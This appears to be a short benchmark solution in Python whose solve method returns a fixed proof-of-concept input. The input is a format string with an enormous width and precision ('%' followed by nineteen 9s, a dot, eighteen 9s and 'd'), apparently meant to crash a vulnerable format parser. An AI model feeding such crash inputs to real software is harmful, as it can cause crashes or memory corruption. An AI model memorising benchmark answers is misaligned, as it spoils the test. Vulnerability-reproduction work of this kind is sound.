class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = "%" + "9" * 19 + "." + "9" * 18 + "d"
        return poc.encode('ascii')
